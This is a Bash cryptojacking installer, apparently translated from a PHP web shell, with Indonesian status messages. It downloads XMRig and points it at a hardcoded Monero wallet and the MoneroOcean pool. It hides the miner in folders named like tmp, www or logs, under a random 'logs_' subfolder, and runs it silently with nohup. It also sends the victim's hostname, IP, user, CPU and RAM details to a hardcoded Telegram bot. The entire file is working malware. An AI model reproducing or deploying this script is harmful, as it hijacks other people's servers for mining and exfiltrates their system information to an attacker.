#!/bin/bash

flush_output() {
    echo "$1"  # Removed <br> and str_repeat as Bash echo doesn't need HTML formatting
}

# Function equivalent to sendTelegram
sendTelegram() {
    local token="$1"
    local chat_id="$2"
    local message="$3"
    local url="https://api.telegram.org/bot${token}/sendMessage"
    local post_data="chat_id=${chat_id}&text=${message}&parse_mode=HTML&disable_web_page_preview=true"
    
    curl -s -X POST "$url" -d "$post_data" --max-time 10
}

# Function equivalent to download_file
download_file() {
    local url="$1"
    local output_path="$2"
    local use_shell="$3"
    
    if [ "$use_shell" = true ]; then
        # Using shell commands (curl or wget)
        if command -v curl >/dev/null 2>&1; then
            curl -L -o "$output_path" "$url" 2>&1
        elif command -v wget >/dev/null 2>&1; then
            wget -O "$output_path" "$url" 2>&1
        else
            return 1  # No curl or wget
        fi
        [ -f "$output_path" ] && return 0 || return 1
    else
        # Using curl if available, else fallback (Bash doesn't have file_get_contents, so using curl)
        if command -v curl >/dev/null 2>&1; then
            curl -s -L --max-time 30 "$url" -o "$output_path"
            [ $? -eq 0 ] && return 0
        fi
        return 1  # Fallback not implemented fully in Bash without external tools
    fi
}

# Function equivalent to get_system_info
get_system_info() {
    local use_shell="$1"
    local whoami
    local uname_info
    local ram_info
    local cpu_cores
    local cpu_threads
    local ip_info
    local hostname
    local xmrig_pid
    
    if [ "$use_shell" = true ]; then
        whoami=$(whoami)
        uname_info=$(uname -a)
        ram_info=$(free -h | grep Mem | awk '{print $2 " (used: " $3 ", free: " $4 ")"}')
        cpu_cores=$(lscpu | grep '^CPU(s):' | awk '{print $2 " cores"}')
        cpu_threads=$(lscpu | grep '^Thread(s) per core:' | awk '{print $4 " threads/core"}')
        ip_info=$(hostname -I | awk '{print $1}')
        hostname=$(hostname)
        xmrig_pid=$(pgrep xmrig)
    else
        whoami=$(whoami)  # Bash built-in
        uname_info=$(uname -a)  # Bash built-in equivalent
        ram_info="N/A (non-shell mode)"
        cpu_cores="N/A (non-shell mode)"
        cpu_threads="N/A (non-shell mode)"
        ip_info=$(hostname -I | awk '{print $1}')  # Approximation
        hostname=$(hostname)
        xmrig_pid=""  # Empty
    fi
    
    # Return as associative array equivalent (using global variables for simplicity)
    SYS_WHOAMI="$whoami"
    SYS_UNAME_INFO="$uname_info"
    SYS_RAM_INFO="$ram_info"
    SYS_CPU_CORES="$cpu_cores"
    SYS_CPU_THREADS="$cpu_threads"
    SYS_IP_INFO="$ip_info"
    SYS_HOSTNAME="$hostname"
    SYS_XMRIG_PID="$xmrig_pid"
}

flush_output "== MoneroOcean PHP Web Installer =="

wallet="48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi"
# Feature: Check folders ['tmp', 'www', 'mail', 'logs'] in parent directory
parent_dir="$(dirname "$(pwd)")"  # Equivalent to dirname(__DIR__)
possible_dirs=("tmp" "www" "mail" "logs" "theme")
BASE_DIR=""
for dir in "${possible_dirs[@]}"; do
    full_path="$parent_dir/$dir"
    if [ -d "$full_path" ]; then
        BASE_DIR="$full_path"
        flush_output "[*] Folder '$dir' ditemukan di $full_path, menggunakan sebagai lokasi instalasi."
        break
    else
        flush_output "[*] Folder '$dir' tidak ditemukan di $full_path."
    fi
done
if [ -z "$BASE_DIR" ]; then
    BASE_DIR="$(pwd)/wpp"
    flush_output "[*] Tidak ada folder yang ditemukan, membuat folder custom 'wpp' di $BASE_DIR."
fi

# If BASE_DIR is restricted, create random folder inside
restricted_dirs=("tmp" "www" "mail" "logs" "theme")
if [[ " ${restricted_dirs[@]} " =~ " $(basename "$BASE_DIR") " ]]; then
    random_folder="logs_$(openssl rand -hex 4)"  # Equivalent to bin2hex(random_bytes(4))
    BASE_DIR="$BASE_DIR/$random_folder"
    
    if [ ! -d "$BASE_DIR" ] && ! mkdir -p "$BASE_DIR"; then
        flush_output "[x] ERROR: Gagal membuat folder random '$random_folder' di $BASE_DIR. Periksa permissions."
        exit 1
    fi
    flush_output "[*] ($(basename "$BASE_DIR")), membuat folder random '$random_folder' di $BASE_DIR."
fi

telegram_token="7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw"
telegram_chatid="5104210301"

flush_output "[*] Wallet: $wallet"
flush_output "[*] Lokasi instalasi: $BASE_DIR"

# Check download method
use_shell_download=true
if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
    use_shell_download=false
    flush_output "[*] Menggunakan PHP built-in untuk download (curl extension atau file_get_contents)"
else
    flush_output "[*] Menggunakan shell_exec untuk download (curl/wget)"
fi

# Check system info method
use_shell_info=true
if ! command -v shell_exec_placeholder >/dev/null 2>&1; then  # Bash doesn't have shell_exec check, assuming available
    use_shell_info=false
    flush_output "[*] Menggunakan PHP built-in untuk info sistem (beberapa info mungkin N/A)"
else
    flush_output "[*] Menggunakan shell_exec untuk info sistem"
fi

# Get initial system info for whoami
get_system_info "$use_shell_info"
whoami="$SYS_WHOAMI"

# Clean old installation
flush_output "[*] Membersihkan instalasi lama..."
pkill xmrig 2>/dev/null
rm -rf "$BASE_DIR"

if ! mkdir -p "$BASE_DIR"; then
    flush_output "[x] ERROR: Gagal membuat direktori instalasi $BASE_DIR. Periksa permissions."
    exit 1
fi

# Download xmrig
xmrig_url="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
xmrig_tar="$BASE_DIR/xmrig.tar.gz"

flush_output "[*] Mengunduh xmrig..."
if ! download_file "$xmrig_url" "$xmrig_tar" "$use_shell_download"; then
    flush_output "[x] ERROR: Gagal mengunduh xmrig dari $xmrig_url!"
    exit 1
fi

# Extract
flush_output "[*] Mengekstrak xmrig..."
tar -xf "$xmrig_tar" -C "$BASE_DIR" 2>&1
rm "$xmrig_tar"

# Edit config.json
config_file="$BASE_DIR/config.json"
if [ ! -f "$config_file" ]; then
    flush_output "[x] ERROR: config.json tidak ditemukan setelah ekstrak!"
    exit 1
fi

config=$(cat "$config_file")
original_config="$config"
config=$(echo "$config" | sed 's/"user":\s*"[^"]*"/"user": "'"$wallet"'"/')
config=$(echo "$config" | sed 's/"url":\s*"[^"]*"/"url": "gulf.moneroocean.stream:10128"/')
config=$(echo "$config" | sed 's/"pass":\s*"[^"]*"/"pass": "'"$whoami"'"/')
config=$(echo "$config" | sed 's/"background":\s*false/"background": true/')

if [ "$config" = "$original_config" ]; then
    flush_output "[!] PERINGATAN: Config.json tidak diubah. Periksa format file."
else
    echo "$config" > "$config_file"
    flush_output "[*] Config.json berhasil diedit."
fi

# Run miner
flush_output "[*] Menjalankan miner di background..."
cd "$BASE_DIR" && nohup ./xmrig --config=config.json >/dev/null 2>&1 &

# Update system info for Telegram
uname_info="$SYS_UNAME_INFO"
ram_info="$SYS_RAM_INFO"
cpu_cores="$SYS_CPU_CORES"
cpu_threads="$SYS_CPU_THREADS"
ip_info="$SYS_IP_INFO"
hostname="$SYS_HOSTNAME"
xmrig_pid="$SYS_XMRIG_PID"
current_url="http://localhost$(pwd)"  # Approximation, as Bash doesn't have $_SERVER

message="✅ <b>XMRig dijalankan sukses</b>
🖥️ <b>Hostname</b>: <code>$hostname</code>
🧠 <b>CPU</b>: $cpu_cores
🧪 <b>Threads/Core</b>: $cpu_threads
📦 <b>RAM</b>: $ram_info
👤 <b>User</b>: $whoami
🌐 <b>IP</b>: $ip_info
🔧 <b>System</b>: <code>$uname_info</code>

⛏️ <b>Process ID</b>:
<code>$xmrig_pid</code>

🔗 <b>Script URL</b>: <a href=\"$current_url\">Open Script</a>"

sendTelegram "$telegram_token" "$telegram_chatid" "$message"

flush_output "[✓] Selesai! Miner sedang berjalan di background."
flush_output "📨 Notifikasi telah dikirim ke Telegram."
